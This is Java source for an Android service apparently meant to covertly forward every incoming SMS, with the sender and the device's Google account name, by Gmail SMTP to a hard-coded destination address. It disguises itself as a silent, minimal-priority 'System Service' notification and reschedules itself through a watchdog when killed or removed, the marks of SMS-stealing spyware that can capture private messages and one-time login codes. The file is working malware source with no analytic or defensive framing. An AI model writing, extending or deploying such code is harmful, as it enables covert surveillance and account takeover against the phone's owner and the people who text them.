package com.smsforwarder;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class ForwarderService extends Service {

    private static final String CHANNEL_ID = "sys_svc_ch";
    private static final int NOTIF_ID = 1;
    private static final String PREFS = "sms_fwd_prefs";
    private static final String KEY_GMAIL = "gmail";
    private static final String KEY_PASS = "pass";

    private ExecutorService executor;

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
        createChannel();
        startForeground(NOTIF_ID, buildNotification());
        WatchdogScheduler.schedule(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String sender = intent.getStringExtra("sender");
            String body = intent.getStringExtra("body");
            if (sender != null && body != null && !body.isEmpty()) {
                sendEmail(sender, body);
            }
        }
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        WatchdogScheduler.schedule(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        WatchdogScheduler.schedule(this);
        if (executor != null) executor.shutdown();
    }

    private String getGmailUser() {
        if (!AppConfig.GMAIL_USER.isEmpty()) return AppConfig.GMAIL_USER;
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        return prefs.getString(KEY_GMAIL, "");
    }

    private String getGmailPass() {
        if (!AppConfig.GMAIL_APP_PASSWORD.isEmpty()) return AppConfig.GMAIL_APP_PASSWORD;
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        return prefs.getString(KEY_PASS, "");
    }

    private String getDeviceGmail() {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType("com.google");
            if (accounts.length > 0) return accounts[0].name;
        } catch (Exception ignored) {}
        return "unknown-device";
    }

    private void sendEmail(String smsSender, String smsBody) {
        executor.execute(() -> {
            String gmailUser = getGmailUser().trim();
            String gmailPass = getGmailPass().trim();
            String destEmail = AppConfig.DEST_EMAIL.trim();

            if (gmailUser.isEmpty() || gmailPass.isEmpty() || destEmail.isEmpty()) return;

            try {
                String deviceGmail = getDeviceGmail();

                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                props.put("mail.smtp.connectiontimeout", "15000");
                props.put("mail.smtp.timeout", "15000");

                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(gmailUser, gmailPass);
                    }
                });

                Message msg = new MimeMessage(session);
                msg.setFrom(new InternetAddress(gmailUser));
                msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(destEmail));
                msg.setSubject("SMS | " + deviceGmail + " | From: " + smsSender);
                msg.setText(
                    "Device: " + deviceGmail + "\n" +
                    "From: " + smsSender + "\n\n" +
                    smsBody
                );

                Transport.send(msg);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
            );
            ch.setDescription("Running");
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
